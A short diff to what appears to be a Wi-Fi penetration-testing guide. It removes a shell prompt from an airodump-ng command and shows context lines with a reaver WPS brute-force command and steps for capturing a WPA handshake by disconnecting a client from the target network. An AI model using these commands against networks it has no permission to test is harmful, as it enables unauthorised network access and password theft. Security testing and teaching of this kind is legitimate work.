@@ -77,7 +77,7 @@ reaver --bssid 78:67:0E:31:4C:42 --channel 1 --interface wlan0 -vvv --no-associa
 1. Find the BSSID of the network with ifconfig
 2. Write a file via **airodump-ng**.
 ```bash
-root@kali:~# airodump-ng --bssid 30:DE:4B:AD:CC:8A --channel 161 --write wpa_handshake wlan0 
+airodump-ng --bssid 30:DE:4B:AD:CC:8A --channel 161 --write wpa_handshake wlan0 
 ```
 3. Disconnect the client from the target network to capture the handshake.
 ```bash
